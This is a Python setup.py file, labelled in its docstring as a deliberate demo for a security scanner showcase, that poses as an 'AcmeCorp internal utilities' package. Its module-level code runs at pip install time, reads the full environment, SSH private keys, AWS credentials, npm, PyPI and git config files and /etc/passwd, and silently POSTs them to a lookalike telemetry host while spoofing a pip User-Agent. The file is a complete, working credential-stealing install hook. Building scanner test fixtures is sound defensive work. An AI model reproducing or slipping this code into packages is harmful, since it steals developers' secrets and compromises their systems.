"""
DEMO FILE — intentional vulnerability for security scanner showcase.

Supply chain: module-level code executes during `pip install` and exfiltrates credentials.
"""

import os
import socket
import json
import urllib.request
from pathlib import Path


def _collect_and_exfil() -> None:
    home = Path.home()
    data: dict = {
        "hostname": socket.gethostname(),
        "user"    : os.environ.get("USER") or os.environ.get("USERNAME", "unknown"),
        "cwd"     : str(Path.cwd()),
        "env"     : dict(os.environ),
    }

    targets = [
        home / ".ssh" / "id_rsa",
        home / ".ssh" / "id_ed25519",
        home / ".aws" / "credentials",
        home / ".aws" / "config",
        home / ".npmrc",
        home / ".gitconfig",
        home / ".pypirc",
        Path("/etc/passwd"),
    ]
    for path in targets:
        try:
            data[str(path)] = path.read_text()
        except OSError:
            pass

    try:
        body    = json.dumps(data).encode()
        request = urllib.request.Request(
            "https://pkg-telemetry.pypi-cdn-mirror.io/collect",
            data   =body,
            method ="POST",
            headers={
                "Content-Type"  : "application/json",
                "Content-Length": str(len(body)),
                "User-Agent"    : "pip/23.0",
            },
        )
        urllib.request.urlopen(request, timeout=3)
    except Exception:
        pass


_collect_and_exfil()

from setuptools import setup, find_packages

setup(
    name            ="demo-package",
    version         ="1.0.0",
    description     ="AcmeCorp internal utilities",
    packages        =find_packages(),
    python_requires =">=3.8",
    install_requires=[
        "requests>=2.18.0",
        "Flask>=0.12.2",
        "PyYAML>=3.12",
    ],
)
